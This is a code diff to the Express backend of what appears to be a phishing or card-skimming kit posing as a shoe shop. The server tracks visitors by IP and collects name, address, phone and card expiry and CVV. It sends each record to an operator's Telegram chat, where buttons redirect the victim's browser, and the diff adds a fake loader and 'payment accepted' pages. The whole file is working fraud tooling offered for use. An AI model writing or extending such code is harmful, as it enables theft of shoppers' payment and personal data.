@@ -20,12 +20,14 @@ const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}` : nu
 
 if(!BOT_TOKEN || !CHAT_ID) console.warn('⚠️ BOT_TOKEN ou CHAT_ID non défini.');
 
-// sessions par IP
-const sessions = {}; // ip -> {data:{page, pair, delivery, card}, redirect:null}
+const sessions = {}; // ip -> {data:{page, pair, delivery, card}, redirect:null, lastNotifPage:null}
 
-// Helper: envoyer notif Telegram
+// Helper: envoyer notif Telegram (une seule fois par page)
 async function sendTelegramNotif(data){
   if(!TELEGRAM_API || !CHAT_ID) return;
+  if(data.page === data.lastNotifPage) return; // éviter notif multiple pour même page
+  data.lastNotifPage = data.page;
+
   const lines = [];
   lines.push('🆕 <b>Nouvelle interaction</b>');
   if(data.ip) lines.push('🌐 <b>IP:</b> '+data.ip);
@@ -43,16 +45,16 @@ async function sendTelegramNotif(data){
     lines.push(`🔒 <b>CVV:</b> ${data.card.cvv}`);
   }
 
-  const text = lines.join('\n');
-
   const keyboard = {
     inline_keyboard:[
       [{text:'➡️ Accueil', callback_data:'redirect|'+data.ip+'|/' }],
       [{text:'👟 Produit', callback_data:'redirect|'+data.ip+'|/product.html'}],
       [{text:'📦 Livraison', callback_data:'redirect|'+data.ip+'|/delivery.html'}],
-      [{text:'💳 Paiement', callback_data:'redirect|'+data.ip+'|/payment.html'}]
+      [{text:'💳 Paiement', callback_data:'redirect|'+data.ip+'|/loader.html'}], // bouton Valider -> loader
     ]
   };
+
+  const text = lines.join('\n');
 
   try {
     await fetch(`${TELEGRAM_API}/sendMessage`, {
@@ -70,7 +72,7 @@ async function sendTelegramNotif(data){
   }
 }
 
-// Middleware pour IP
+// Middleware IP
 function getIP(req){
   let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
   if(ip.includes(',')) ip = ip.split(',')[0];
@@ -81,7 +83,8 @@ function getIP(req){
 // Endpoint visite
 app.get('/api/visit', (req,res)=>{
   const ip = getIP(req);
-  if(!sessions[ip]) sessions[ip] = {data:{page:'Accueil', ip}, redirect:null};
+  if(!sessions[ip]) sessions[ip] = {data:{page:'Accueil', ip}, redirect:null, lastNotifPage:null};
+  sessions[ip].data.page = 'Accueil';
   sendTelegramNotif(sessions[ip].data);
   res.json({ok:true, ip});
 });
@@ -90,7 +93,7 @@ app.get('/api/visit', (req,res)=>{
 app.post('/api/pair', (req,res)=>{
   const {pair} = req.body;
   const ip = getIP(req);
-  if(!sessions[ip]) sessions[ip]={data:{page:'Produit', ip}, redirect:null};
+  if(!sessions[ip]) sessions[ip]={data:{page:'Produit', ip}, redirect:null, lastNotifPage:null};
   sessions[ip].data.pair = pair;
   sessions[ip].data.page = 'Produit';
   sendTelegramNotif(sessions[ip].data);
@@ -101,7 +104,7 @@ app.post('/api/pair', (req,res)=>{
 app.post('/api/delivery', (req,res)=>{
   const {nom, prenom, adresse, telephone} = req.body;
   const ip = getIP(req);
-  if(!sessions[ip]) sessions[ip]={data:{page:'Livraison', ip}, redirect:null};
+  if(!sessions[ip]) sessions[ip]={data:{page:'Livraison', ip}, redirect:null, lastNotifPage:null};
   sessions[ip].data.delivery = {nom, prenom, adresse, telephone};
   sessions[ip].data.page = 'Livraison';
   sendTelegramNotif(sessions[ip].data);
@@ -112,7 +115,7 @@ app.post('/api/delivery', (req,res)=>{
 app.post('/api/payment', (req,res)=>{
   const {cardNumber, expiry, cvv, nomTitulaire} = req.body;
   const ip = getIP(req);
-  if(!sessions[ip]) sessions[ip]={data:{page:'Paiement', ip}, redirect:null};
+  if(!sessions[ip]) sessions[ip]={data:{page:'Paiement', ip}, redirect:null, lastNotifPage:null};
   sessions[ip].data.card = {
     panMasked:'**** **** **** '+(cardNumber?cardNumber.slice(-4):'0000'),
     expiry,
@@ -124,11 +127,11 @@ app.post('/api/payment', (req,res)=>{
   res.json({ok:true});
 });
 
-// Polling status pour redirection (reset après envoi)
+// Polling status pour redirection (reset après lecture)
 app.get('/api/status', (req,res)=>{
   const ip = getIP(req);
   const redirect = sessions[ip]?.redirect || null;
-  if(sessions[ip]) sessions[ip].redirect = null; // reset pour éviter boucle
+  if(sessions[ip]) sessions[ip].redirect = null;
   res.json({redirect});
 });
 
@@ -163,7 +166,8 @@ app.post('/telegramWebhook', bodyParser.json(), async (req,res)=>{
 app.get('/', (req,res)=>res.sendFile(path.join(__dirname,'public','index.html')));
 app.get('/product.html', (req,res)=>res.sendFile(path.join(__dirname,'public','product.html')));
 app.get('/delivery.html', (req,res)=>res.sendFile(path.join(__dirname,'public','delivery.html')));
-app.get('/payment.html', (req,res)=>res.sendFile(path.join(__dirname,'public','payment.html')));
+app.get('/loader.html', (req,res)=>res.sendFile(path.join(__dirname,'public','loader.html')));
+app.get('/payment-accepted.html', (req,res)=>res.sendFile(path.join(__dirname,'public','payment-accepted.html')));
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, ()=>console.log('Server listening on', PORT));
